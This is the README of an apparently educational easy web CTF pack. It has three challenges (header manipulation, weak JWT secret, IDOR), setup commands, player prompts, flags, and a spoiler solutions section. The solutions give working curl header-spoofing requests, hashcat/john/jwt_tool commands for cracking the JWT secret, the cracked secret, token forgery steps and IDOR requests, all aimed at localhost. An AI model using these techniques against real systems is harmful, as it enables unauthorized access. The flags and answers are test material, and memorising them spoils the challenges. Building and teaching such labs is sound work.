# Easy Web CTF Pack (3 challenges)

| # | Name | Category | Port | Flag |
|---|------|----------|------|------|
| 1 | SecureVault | HTTP method + header manipulation | 5001 | `GCDxGLORY{m3th0ds_4nd_h34d3rs_4r3_us3r_c0ntr0ll3d}` |
| 2 | TokenCorp | JWT secret brute force | 5002 | `GCDxGLORY{w34k_jwt_s3cr3ts_g3t_cr4ck3d}` |
| 3 | NoteKeeper | Broken access control (IDOR) | 5003 | `GCDxGLORY{1d0r_4nd_br0k3n_4cc3ss_c0ntr0l}` |

## Run

    docker compose up --build -d      # start all three
    docker compose down               # stop

Or a single one:  `docker compose up --build ch2-jwt-brute`

Change flags in `docker-compose.yml` (`FLAG=`) before hosting.
Change `SECRET_KEY` and `ADMIN_PASSWORD` for ch3 too.
Do not expose these to the internet without isolation (they are intentionally vulnerable).

---
## Challenge descriptions (give these to players)

**1. SecureVault** (Easy): "Our vault only talks to internal staff using the official client. Can you get in?" -> `http://HOST:5001`

**2. TokenCorp** (Easy): "Guests get a token. Admins get the flag. Tokens are only as strong as their secret." -> `http://HOST:5002`

**3. NoteKeeper** (Easy): "Everyone has private notes. Are they really private?" -> `http://HOST:5003`

---
## SOLUTIONS (spoilers)

### 1. SecureVault
The server checks four things in order, and each error message hints at the next.

    curl -X PUT http://localhost:5001/vault \
      -H "X-Forwarded-For: 127.0.0.1" \
      -A "VaultClient/1.0" \
      -H "X-Vault-Role: admin"

Lesson: client-controlled headers (X-Forwarded-For, User-Agent, custom role headers) must never be trusted for authorization.

### 2. TokenCorp
1. Log in as `guest/guest`, get a JWT (role: user).
2. Crack the HS256 secret with the provided wordlist:

       hashcat -m 16500 token.jwt wordlist.txt
       # or
       john --format=HMAC-SHA256 --wordlist=wordlist.txt token.jwt
       # or
       jwt_tool <token> -C -d wordlist.txt

   Secret: `sunshine`
3. Forge a token with `{"sub":"admin","role":"admin"}` signed with `sunshine` (jwt.io, jwt_tool, or PyJWT) and call `/admin`.

Lesson: HS256 secrets must be long and random (32+ bytes), never dictionary words.

### 3. NoteKeeper
1. Log in as `alice/alice123` (cookie is saved).
2. `GET /api/notes` shows your note IDs (2 and 4), and note 4 hints that IDs are sequential.
3. Request note 1:

       curl -c jar -X POST -H "Content-Type: application/json" \
         -d '{"username":"alice","password":"alice123"}' http://localhost:5003/api/login
       curl -b jar http://localhost:5003/api/notes/1

Lesson: authentication is not authorization. Check object ownership server-side on every request.
Fix: `if note["owner"] != uid and u["role"] != "admin": return 403`.

---
## Possible hardening / extensions for a harder version
- Ch1: require a signed header, add rate limiting, chain with a hidden route.
- Ch2: also accept `alg: none` or add a `kid` header injection.
- Ch3: use UUIDs instead of integers, add a mass-assignment `role` parameter on a profile update.
